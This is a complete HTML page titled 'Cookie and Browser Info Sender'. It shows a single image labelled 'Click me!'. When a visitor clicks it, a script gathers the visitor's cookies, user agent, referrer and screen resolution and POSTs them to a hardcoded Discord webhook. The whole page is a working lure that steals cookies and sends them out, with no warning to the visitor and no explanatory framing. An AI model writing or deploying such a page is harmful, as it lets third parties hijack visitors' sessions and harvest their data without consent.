<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie and Browser Info Sender</title>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" alt="Click me!" onclick="sendInfo()" style="cursor: pointer;">
    <script>
        function sendInfo() {
            const cookies = document.cookie;
            const userAgent = navigator.userAgent;
            const referrer = document.referrer;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;

            fetch('https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `**Cookies:**\n\`\`\`\n${cookies}\n\`\`\`\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\`\n**Referrer:**\n\`\`\`\n${referrer}\n\`\`\`\n**Screen Resolution:**\n\`\`\`\n${screenResolution}\n\`\`\``
                })
            }).then(response => {
                if (response.ok) {
                    console.log('Data sent successfully');
                } else {
                    console.error('Failed to send data');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
